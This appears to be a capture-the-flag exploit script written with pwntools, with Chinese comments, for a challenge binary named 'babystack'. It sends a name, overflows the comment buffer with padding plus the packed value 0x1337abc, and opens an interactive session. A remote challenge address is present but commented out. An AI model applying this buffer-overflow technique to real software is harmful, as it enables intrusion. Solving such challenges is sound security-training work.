#!/usr/bin/env python
# -*- coding: UTF-8 -*-
from pwn import *

# 输出详细信息
# context(log_level='debug')

# 本地测试
p = process("./babystack")
# p = remote("34.80.207.78", 10002)

p.sendafter("Enter your name:", 'A' * 0x18) # 可以输入任意内容
p.sendafter("Enter your comment:", 'A' * 0xF8 + p64(0x1337abc))

p.interactive()
